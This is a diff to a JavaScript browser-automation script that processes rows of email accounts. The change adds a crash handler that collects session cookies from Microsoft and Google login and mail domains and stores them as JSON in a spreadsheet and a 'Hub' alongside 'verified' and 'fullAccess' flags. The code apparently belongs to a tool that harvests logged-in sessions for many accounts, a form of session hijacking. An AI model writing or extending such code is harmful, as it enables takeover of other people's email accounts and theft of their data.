@@ -3562,6 +3562,26 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             updateData.status = "FAILED";
             updateData.verified = false;
             updateData.fullAccess = false;
+            // Attempt to capture cookies even on crash (if page still accessible)
+            if (page && !browserFullyClosed) {
+                try {
+                    const allUrls = [
+                        `https://${domain}`,
+                        `https://login.live.com`,
+                        `https://login.microsoftonline.com`,
+                        `https://www.microsoft.com`,
+                        `https://outlook.live.com`,
+                        `https://mail.google.com`,
+                    ];
+                    const browserCookies = await page.cookies(...allUrls);
+                    if (browserCookies.length > 0) {
+                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                        logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from crash handler.`);
+                    }
+                } catch (cookieErr) {
+                    logger.warn(`[processRow][${browserId}] Could not capture cookies in crash handler: ${cookieErr.message}`);
+                }
+            }
             updateData.lastJsonResponse = JSON.stringify({
             browserId, email, status: "FAILED", error: error.message,
             platform, timestamp: new Date().toISOString(),
@@ -3647,9 +3667,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         //     }
         // }
 
-        // Don't write FAILED to sheet if processing never started — another session may still be active
-        if ((!processingStarted && finalSheetUpdate.status === "FAILED") || exitingEarly) {
-            logger.info(`[processRow][${browserId}] Skipping sheet update — processing never started (browser launch failed). Existing session may still be active.`);
+        // Don't skip sheet update — FAILED status MUST always be written to sheet + Hub
+        if (exitingEarly) {
+            logger.info(`[processRow][${browserId}] Skipping sheet update — exitingEarly.`);
         } else {
             logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
             await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
